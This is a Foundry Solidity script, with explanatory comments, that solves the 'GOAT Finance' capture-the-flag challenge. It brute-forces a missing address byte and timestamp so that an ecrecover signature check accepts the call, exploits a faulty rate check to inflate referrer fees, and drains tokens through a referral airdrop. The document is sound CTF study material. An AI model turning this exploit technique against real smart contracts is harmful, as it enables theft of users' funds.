// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/goat-finance/GOATFinance.sol";
import "../src/goat-finance/Solve.sol";

// Challenge was pretty guessy but here it is:
// Working backwards from the interesting contract functions
// Looking at DynamicRew() it seems we can set the referrerFees and transferRate
//  require(_transferRate <= 50 && _transferRate <= 50); however it is doing the check incorrectly
// We have v,r,s and rewmax. We just need to find the right _msgSender and blocktimestamp

// string msgsender = "0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0"; this is the
// sender but its missing a byte at the end, and it is also a string lol. time
// is also set to 1677729607 and there is a check that the timestamp is less
// than 1677729610, so we can guess that its one of these combinations of
// addresses and block timestamp

// So we brute force it, find the address, bypass ecrecover and then set the
// transferRate to 50 and Referer fees to > 10000000 which is the requirement
// for the challenge.

// Then we deploy a contract to claim the airdrop and set our address as the
// referal then when refereal fees are calculated the contract will send us a
// lot of tokens and win
contract GOATScript is Script {
    address contractAddress = vm.envAddress("CONTRACT_ADDRESS");
    uint256 playerKey = vm.envUint("PRIVATE_KEY");
    PrivilegeFinance challenge;
    address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;

    function setUp() public {
        challenge = new PrivilegeFinance();
    }

    function run() public {
        address sender;
        uint256 blockTimestamp = 1677729607;
        while (true) {
            sender = testBlockTimestamp(blockTimestamp);
            if (sender != address(0)) break;
            ++blockTimestamp;
        }
        vm.startBroadcast(playerKey);
        challenge.DynamicRew(sender, blockTimestamp, 10000001, 50);
        new SolveGoat(address(challenge), admin);
        challenge.setflag();
        require(challenge.isSolved(), "challenge not solved");
    }

    function testBlockTimestamp(uint256 blockTimestamp) public view returns (address) {
        bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
        bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
        uint8 v = 28;

        uint256 rewmax = 65000000000000000000000;
        for (
            uint256 i = 0x0071Fa690CCcDC285e3CB6D5291eA935CFdFE4E000;
            i <= 0x0071fA690CcCDC285E3Cb6d5291EA935cfdfE4E0ff;
            i++
        ) {
            address add = address(uint160(i));
            bytes32 _hash = keccak256(abi.encodePacked(add, rewmax, blockTimestamp));
            address a = ecrecover(_hash, v, r, s);
            if (a == admin) {
                return add;
            }
        }
        return address(0);
    }
}
